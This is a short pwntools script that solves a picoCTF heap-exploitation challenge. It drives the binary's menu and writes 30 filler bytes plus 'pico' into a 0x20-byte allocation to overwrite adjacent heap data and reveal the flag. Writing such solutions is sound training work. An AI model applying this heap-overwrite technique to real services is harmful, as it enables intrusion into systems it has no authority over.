#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc tethys.picoctf.net 62271"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

io.sendlineafter(b"choice: ", b"5")
io.sendlineafter(b"choice: ", b"2")
io.sendlineafter(b"allocation: ", str(0x20).encode())
io.sendlineafter(b"flag: ", b"A" * 0x1e + b"pico")
io.sendlineafter(b"choice: ", b"4")

io.interactive()
